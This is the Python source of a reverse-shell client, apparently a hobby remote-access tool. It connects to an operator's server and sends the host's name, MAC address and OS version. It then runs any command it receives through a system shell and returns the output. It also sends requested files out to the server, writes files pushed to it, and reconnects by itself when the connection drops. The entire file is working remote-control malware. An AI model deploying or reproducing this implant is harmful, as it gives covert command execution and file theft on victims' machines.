import socket
import random
import time
import os
import subprocess
import getmac
import platform as p
import json
import pickle


isOn = False  # If client connected to server
host = "127.0.0.1"
port = 2021
# port = 6060
buffer = 2048


def connect():
    global isOn
    global clientSocket
    connectionTimeOut = 0
    clientSocket = socket.socket()

    print("# # # # # # # # # # # # # # \n" + "   Trying to connect" + "\n---------------------")
    print("# # # # # # # # # # # # # # \n")

    while connectionTimeOut < 5:

        try:
            clientSocket.connect((host, port))
            isOn = True
            print("Established connection ", host, port)
            sendFirstMessageToServer()
            break
        except socket.error as e:
            if ConnectionRefusedError:
                time.sleep(2)
                print("Waiting for Server response")
                time.sleep(2)
                connectionTimeOut += 1
   # isOn = False    # in case loop reaches connectionTimeOut then isOn is false


def sendFirstMessageToServer():

    clientInfo = getClientInfo()
    clientInfoBytes = pickle.dumps(clientInfo)

    clientSocket.send(clientInfoBytes)



def getClientInfo():

    global clientSocket
    hostName = socket.gethostname()
    ID = random.randint(1,1000)
    macAddress = getmac.get_mac_address()
    osVersion = p.platform()

    # pwd = os.getcwd()
    # listDir = os.listdir(pwd)
    # clientInfo = {"ID" : str(ID), "host name" : str(hostName), " mac address": str(macAddress), "OS version " : str(osVersion), "current dir list" : str(listDir) }

    clientInfo = {"ID": str(ID), "host name": str(hostName), "mac address": str(macAddress),
                  "OS version": str(osVersion)}
    clientInfo = str(clientInfo)
    print (clientInfo)
    clientInfoJson = json.dumps(clientInfo)


    return clientInfoJson
    # return clientInfo

    #TODO need add more info about client( currentPath whatOS currentUserName macAdress)


def listen():
    global clientSocket

    dataFromServer = clientSocket.recv(buffer).decode()
    if 'exit' in dataFromServer:
        clientSocket.send("exiting currentShell".encode())
    elif dataFromServer == '':
        clientSocket.send("exiting currentShell".encode())
    elif 'cd ' in dataFromServer:
        try:
            cd , dir = dataFromServer.split(' ')
            os.chdir(dir)
            pwd = "you are here: " + os.getcwd()
            clientSocket.send(str.encode(pwd))

        except Exception as e:
            clientSocket.send(str(e).encode())
    elif 'pwd' in dataFromServer:
        try:
            pwd = os.getcwd()
            clientSocket.send(str(pwd).encode())

        except Exception as e:
            clientSocket.send(str(e).encode())

    elif 'dir' in dataFromServer:
        try:
            pwd = os.getcwd()
            listDir = os.listdir(pwd)
            clientSocket.send(str(listDir).encode())
        except Exception as e:
            clientSocket.send(str(e).encode())

    elif "download" in dataFromServer:
        download, path = dataFromServer.split(' ', 1)
        try:
            transfer(clientSocket, path)

        except Exception as e:
            clientSocket.send(str(e).encode())

    elif "upload" in dataFromServer:
        dropUpload, pathUpload = dataFromServer.split(' ', 1)

        try:
           upload(clientSocket, pathUpload)

        except Exception as e:
           clientSocket.send(str(e).encode())

    else:
        CMD = subprocess.Popen(dataFromServer, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        clientSocket.send(CMD.stdout.read())
        clientSocket.send(CMD.stderr.read())


def transfer(clientSocket, path):
    if os.path.exists(path):
        print("path exist, downloading now ...")
        f = open(path, 'rb')
        packet = f.read(buffer)

        while packet:
            print(packet)
            clientSocket.send(packet)
            packet = f.read(buffer)
        clientSocket.send(b"Download Completed")
    else:
        clientSocket.send(b"File Does not exist")
        # TODO should think about adding the .file extanstion after donwloading(in case i want to download .exe as .txt)


def upload(clientSocket, path):
        print("uploading file")
        pwd = os.getcwd()
        fileName = os.path.basename(path)
        destanationFile = pwd + "\\" + fileName
        # if os.path.exists():
        #     destanationFile = destanationFile + str(random.randint())

        f = open(destanationFile, 'wb')

        clientConfirmUpload = clientSocket.send("Ready to Download".encode())
        packet = clientSocket.recv(buffer)
        while True:
            packet = clientSocket.recv(buffer)
            print(packet)
            if packet.endswith(b"Download Completed"):
                    print("Transfer Completed")
                    break
            elif packet.endswith(b"Upload Completed"):
                print("Transfer Completed")
                break
            f.write(packet)
        f.close()

# TODO incomplet


def main():
    global isOn

    while True:
        if not isOn:

                connect()

        else:
            try:
                listen()
            except Exception as e:
                print(str(e))
                print(" Lost Connection, Retrying ...")
                isOn = False
                time.sleep(2)


if __name__ == '__main__':
    main()
